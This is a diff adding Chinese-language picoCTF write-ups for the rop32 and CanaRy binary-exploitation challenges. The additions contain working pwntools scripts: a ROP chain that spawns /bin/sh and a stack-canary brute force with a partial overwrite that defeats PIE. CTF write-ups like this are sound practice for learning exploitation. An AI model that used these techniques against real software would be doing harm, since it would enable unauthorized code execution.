@@ -251,4 +251,119 @@ r.interactive()
 
 ```
 picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_f60266f9}
+
 *阿送出去 他說flag不對？？？*
+## rop32 - Points: 400 - (Solves: 356)Binary Exploitation
+### review
+看到writeup 我快被我自己氣死
+>ROPgadget --binary ./vuln --rop --badbytes "0a"
+
+當初有發現 碰到`0a` 送進去的payload 就不是我要的
+
+知道要找代替的 直接從gadget 找 我沒有找到^^
+
+看了help 也沒有發現有 badbytes 這選項 我在幹麻
+
+>ROPgadget --binary r32 --ropchain --badbytes "0a"
+### code
+```
+from pwn import *
+r=process('./vuln')
+r.recvuntil('\n')
+
+from struct import pack
+
+# Padding goes here
+p = 'a'*28
+
+p += pack('<I', 0x0806ee6b) # pop edx ; ret
+p += pack('<I', 0x080da060) # @ .data
+p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
+p += '/bin'
+p += pack('<I', 0x080da060) # padding without overwrite edx
+p += pack('<I', 0x41414141) # padding
+p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x0806ee6b) # pop edx ; ret
+p += pack('<I', 0x080da064) # @ .data + 4
+p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
+p += '//sh'
+p += pack('<I', 0x080da064) # padding without overwrite edx
+p += pack('<I', 0x41414141) # padding
+p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x0806ee6b) # pop edx ; ret
+p += pack('<I', 0x080da068) # @ .data + 8
+p += pack('<I', 0x08056420) # xor eax, eax ; ret
+p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x080481c9) # pop ebx ; ret
+p += pack('<I', 0x080da060) # @ .data
+p += pack('<I', 0x0806ee92) # pop ecx ; pop ebx ; ret
+p += pack('<I', 0x080da068) # @ .data + 8
+p += pack('<I', 0x080da060) # padding without overwrite ebx
+p += pack('<I', 0x0806ee6b) # pop edx ; ret
+p += pack('<I', 0x080da068) # @ .data + 8
+p += pack('<I', 0x08056420) # xor eax, eax ; ret
+p += pack('<I', 0x0807c2fa) # inc eax ; ret
+p += pack('<I', 0x0807c2fa) # inc eax ; ret
+p += pack('<I', 0x0807c2fa) # inc eax ; ret
+p += pack('<I', 0x0807c2fa) # inc eax ; ret
+p += pack('<I', 0x0807c2fa) # inc eax ; ret
+p += pack('<I', 0x0807c2fa) # inc eax ; ret
+p += pack('<I', 0x0807c2fa) # inc eax ; ret
+p += pack('<I', 0x0807c2fa) # inc eax ; ret
+p += pack('<I', 0x0807c2fa) # inc eax ; ret
+p += pack('<I', 0x0807c2fa) # inc eax ; ret
+p += pack('<I', 0x0807c2fa) # inc eax ; ret
+p += pack('<I', 0x08049563) # int 0x8
+r.sendline(p)
+r.interactive()
+
+```
+picoCTF{rOp_t0_b1n_sH_44c05daa}
+## CanaRy - Points: 300 - (Solves: 438)Binary Exploitation
+### review
+
+卡在pie的部份 知道後1.5btye 不會變
+
+當初怎沒想到蓋1.5byte 上去
+
+用r2 找addr
+```
+>>> a=bin(0x7ed)[2:]
+>>> len(a)
+11
+```
+11 byte 可以
+### code
+```
+from pwn import *
+key = ''
+for i in range(4):
+  for c in range(256):
+    sh=process('./vuln')
+    c = chr(c)
+    sh.sendlineafter('> ', str(33+i))
+    sh.sendlineafter('> ', 'a'*32+key+c)
+    data = sh.recvall()
+    if 'Stack Smashing Detected' not in data:
+      key += c
+      print enhex(key)
+      break
+```
+```
+from pwn import *
+key = unhex('4c6a6748')
+while 1:
+        sh=process('./vuln')
+        sh.sendlineafter('> ', str(32+4+12+6))
+        sh.sendlineafter('> ', 'a'*32+key+'a'*(4+12)+'\xed\x07')
+ # sh.interactive()
+        data = sh.recvall(timeout=0.5)
+        if 'pico' in data:
+                print data
+                break
+
+```
+
+picoCTF{cAnAr135_mU5t_b3_r4nd0m!_bf34cd22}
+
+*他說flag不對*
